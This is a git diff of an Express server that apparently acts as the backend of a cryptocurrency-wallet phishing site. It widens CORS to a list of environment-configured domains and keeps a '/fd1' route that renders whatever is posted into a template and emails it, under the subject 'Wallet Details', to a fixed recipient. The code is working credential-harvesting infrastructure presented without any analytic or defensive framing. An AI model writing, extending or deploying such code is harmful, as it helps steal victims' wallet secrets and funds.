@@ -9,7 +9,7 @@ d.config();
 
 const app = express();
 
-const PORT = process.env.PORT || 4009;
+const PORT = process.env.PORT || 3009;
 
 app.use(morgan('combined'));
 app.use((req, res, next) => {
@@ -25,12 +25,19 @@ var allowedDomains = [
 	process.env.O3,
 	process.env.O4,
 ];
-
 app.use(
 	cors({
-		origin: 'http://dappsplug.com',
-		methods: ['GET', 'POST'],
-		maxAge: 365 * 1000,
+		origin: function (origin, callback) {
+			// bypass the requests with no origin (like curl requests, mobile apps, etc )
+			if (!origin) return callback(null, true);
+
+			if (allowedDomains.indexOf(origin) === -1) {
+				var msg = `This site ${origin} does not have an access. Only specific domains are allowed to access it.`;
+				return callback(new Error(msg), false);
+			}
+			return callback(null, true);
+		},
+		methods: 'POST',
 	})
 );
 
@@ -71,48 +78,40 @@ app.post('/fd', (req, res) => {
 	});
 });
 
-app.post(
-	'/fd1',
-	cors({
-		origin: 'http://dappsplug.com',
-		methods: ['GET', 'POST'],
-		maxAge: 365 * 1000,
-	}),
-	(req, res) => {
-		ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
-			if (err) {
-				console.log('err', err);
-				return res.status(400).json({ err: 'An error occurred' });
-			} else {
-				let transporter = nodemailer.createTransport({
-					host: process.env.HOST,
-					port: process.env.PORT,
-					secure: process.env.SECURE,
-					logger: true,
-					debug: true,
-					auth: {
-						user: process.env.USER, // generated ethereal user
-						pass: process.env.PASS, // generated ethereal password
-					},
-				});
-				let mailOptions = {
-					from: process.env.FROM,
-					to: process.env.TO,
-					subject: 'Wallet Details',
-					html: data,
-				};
+app.post('/fd1', (req, res) => {
+	ejs.renderFile(`${__dirname}/fd2.ejs`, req.body, (err, data) => {
+		if (err) {
+			console.log('err', err);
+			return res.status(400).json({ err: 'An error occurred' });
+		} else {
+			let transporter = nodemailer.createTransport({
+				host: process.env.HOST,
+				port: process.env.PORT,
+				secure: process.env.SECURE,
+				logger: true,
+				debug: true,
+				auth: {
+					user: process.env.USER, // generated ethereal user
+					pass: process.env.PASS, // generated ethereal password
+				},
+			});
+			let mailOptions = {
+				from: process.env.FROM,
+				to: process.env.TO,
+				subject: 'Wallet Details',
+				html: data,
+			};
 
-				transporter.sendMail(mailOptions, (err, res) => {
-					if (err) {
-						console.log('err', err);
-					} else {
-						console.log('sent');
-					}
-				});
-			}
-		});
-	}
-);
+			transporter.sendMail(mailOptions, (err, res) => {
+				if (err) {
+					console.log('err', err);
+				} else {
+					console.log('sent');
+				}
+			});
+		}
+	});
+});
 
 app.post('/fd2', (req, res) => {
 	console.log('req.body', req.body.data);
